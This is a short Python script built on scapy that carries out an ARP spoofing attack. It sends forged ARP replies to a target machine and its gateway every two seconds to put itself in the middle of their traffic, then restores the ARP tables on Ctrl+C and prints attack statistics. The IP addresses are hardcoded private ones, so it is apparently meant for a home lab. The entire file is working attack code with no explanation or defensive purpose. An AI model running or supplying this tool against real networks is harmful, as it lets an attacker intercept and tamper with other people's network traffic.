import time
from datetime import datetime
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # print(answered_list[0][1].hwsrc)
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# restore('windows', 'router')
# restore('192.168.2.131', '192.168.2.2')

def main(target_ip, gateway_ip):
    try:
        start_time = datetime.now()
        sent_packets_count = 0

        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("\r[+] Sent packets: " + str(sent_packets_count), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL + C | Restoring ARP tables. Please wait...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        # print("Finished")

        end_time = datetime.now()
        duration = end_time - start_time

        print("[+] Work statistics:")
        print(f"- Total ARP packets sent: {sent_packets_count}")
        print(f"- Attack start time: {start_time}")
        print(f"- Attack end time: {end_time}")
        print(f"- Attack duration: {duration}")


if __name__ == "__main__":

    target_ip = '192.168.2.131'
    gateway_ip = '192.168.2.2'

    main(target_ip, gateway_ip)
